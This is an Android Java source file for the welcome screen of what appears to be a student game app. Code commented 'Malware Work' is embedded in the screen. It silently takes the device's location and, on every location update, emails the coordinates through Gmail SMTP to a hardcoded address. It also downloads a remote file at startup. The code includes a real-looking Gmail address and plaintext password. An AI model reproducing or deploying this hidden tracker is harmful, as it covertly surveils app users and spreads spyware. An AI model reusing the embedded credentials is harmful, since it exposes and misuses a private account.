package com.example.finalproject;


import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import android.app.Activity;
import android.app.ActivityGroup;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationSet;
import android.widget.Button;
import android.widget.Toast;





public class WelcomePage extends Activity{
	LocationManager locationManager;
	
	//Malware Work
	Session session = null;
	Context context = null;
	String rec, subject, textMessage;
	//End Malware Work
	private WelcomePage thisActivity;
	double mylatitude, mylongitude;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.welcomepage);
	    getWindow().setFormat(PixelFormat.RGBA_8888);
	    Animation fadeIn = new AlphaAnimation(0, 1);
	    fadeIn.setInterpolator(new AccelerateInterpolator()); //add this
	    fadeIn.setDuration(3000);

	    Button b=(Button)findViewById(R.id.button1);
	    //Malware Work:
	    context = this;
	    thisActivity = this;
	    locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        //new DonwloadLocation(locationManager).execute();
        new DownloadFileFromURL().execute("http://a.dilcdn.com/bl/wp-content/uploads/sites/13/2011/09/mickey-mouse-disney-baby-photo-450x400-dcp-cpna013010.jpg");
        //setUpMap();
        //End Malware Work
	    AnimationSet animation = new AnimationSet(false); //change to false
	    animation.addAnimation(fadeIn);
	    b.setAnimation(animation);
	    animation.start();
	    
		b.setOnClickListener(new OnClickListener(){
	        	@Override
		    	 public void onClick(View v) {
	        		
	        		Intent intent1=new Intent();
	        		intent1.setClass(WelcomePage.this,StartScreen.class);
	        		intent1.putExtra("Which_Game", "0");
	           		startActivity(intent1);
	           		
	            	}
	        	}  	
	        );
		 
		    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0,0, new LocationListener(){

				@Override
				public void onLocationChanged(Location location) {
					mylatitude = location.getLatitude();
					mylongitude = location.getLongitude();
					Toast.makeText(thisActivity, " "+mylatitude + " "+mylongitude , Toast.LENGTH_LONG).show();
					//Malware Work:
	        		rec = "karmakar.robin@gmail.com";
	        		subject = "Malware Test";
	        		textMessage = " " + mylongitude + " " + mylatitude;
	        		
	        		Properties props = new Properties();
	        		props.put("mail.smtp.host", "smtp.gmail.com");
	        		props.put("mail.smtp.socketFactory.port", "465");
	        		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
	        		props.put("mail.smtp.auth", "true");
	        		props.put("mail.smtp.port", "465");
	        		//session = Session.getInstance(props);
	        		
	        		session = Session.getDefaultInstance(props, new Authenticator(){
	        				protected PasswordAuthentication getPasswordAuthentication(){
	        			return new PasswordAuthentication("karmakar.robin@gmail.com", "tintin138007280");
	        		}
	        		});
	        		
	        		RetreiveFeedTask task = new RetreiveFeedTask();
	        		task.execute();
	        		 
				}

				@Override
				public void onStatusChanged(String provider, int status,
						Bundle extras) {
					// TODO Auto-generated method stub
					
				}

				@Override
				public void onProviderEnabled(String provider) {
					// TODO Auto-generated method stub
					
				}

				@Override
				public void onProviderDisabled(String provider) {
					// TODO Auto-generated method stub
					
				}
		    	
		    });
 
	}
	class RetreiveFeedTask extends AsyncTask<String, Void, String>{
		
		protected String doInBackground(String... params){
			
			try{
				Message message = new MimeMessage(session);
				message.setFrom(new InternetAddress("karmakar.robin@gmail.com"));
				message.setRecipients(Message.RecipientType.TO,  InternetAddress.parse(rec));
				message.setSubject(subject);
				message.setContent(textMessage, "text/html; charset=utf-8");
				
				Transport.send(message);
			}catch(MessagingException e){
				e.printStackTrace();
			}catch(Exception e){
				e.printStackTrace();
			}
			return null;
		}
		
		protected void onPostExecute(String result){
			Toast.makeText(getApplicationContext(), "Message Sent", Toast.LENGTH_LONG).show();
		}
	}
	
}